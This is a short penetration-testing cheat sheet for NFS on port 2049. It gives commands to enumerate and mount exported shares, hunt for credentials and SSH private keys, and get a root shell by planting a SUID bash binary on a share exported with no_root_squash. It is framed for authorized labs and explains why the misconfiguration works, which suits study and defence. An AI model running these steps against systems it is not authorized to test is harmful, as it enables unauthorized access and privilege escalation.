# NFS – Port 2049

**Port:** 2049/TCP  
**Service:** Network File System (NFS)

NFS allows systems to share directories and files over a network.

### 1. Enumeration

`nmap -sV -p 111,2049 --script=nfs-* <IP>` : Enumerate NFS services and available information.

`showmount -e <IP>` : List exported shared directories.

### 2. Mounting NFS Shares

`mkdir /tmp/mount` : Create a mount point.

`sudo mount -t nfs <IP>:<share> /tmp/mount -o nolock` : Mount the shared directory.

`ls -la /tmp/mount/` : Explore shared files and directories.

Look for interesting files, credentials, configuration files, or SSH private keys.

### 3. SSH Key Access

If an SSH private key is discovered:

`chmod 600 <keyname>` : Set secure permissions.

`ssh -i <keyname> <username>@<IP>` : Connect using the private key.

### 4. Exploitation – Root via SUID

Check whether the NFS export allows `no_root_squash`.

**If enabled:** Root users on the client can retain root ownership when creating files on the shared directory.

In an authorized lab, use a compatible Bash binary:

`sudo cp bash /tmp/mount/` : Copy Bash into the mounted share.

`sudo chown root:root /tmp/mount/bash` : Set root ownership.

`sudo chmod u+s /tmp/mount/bash` : Set the SUID bit.

On the target, access the shared directory and execute:

`./bash -p` : Attempt to obtain a root shell.

**Why it works:** The `no_root_squash` option allows root privileges from the client to be preserved on the NFS share. A root-owned SUID executable can then provide root privileges when executed on the target, provided the filesystem permits SUID execution.

**Note:** This technique requires `no_root_squash`, compatible filesystem permissions, and an executable mount. NFS shares do not automatically provide root access.
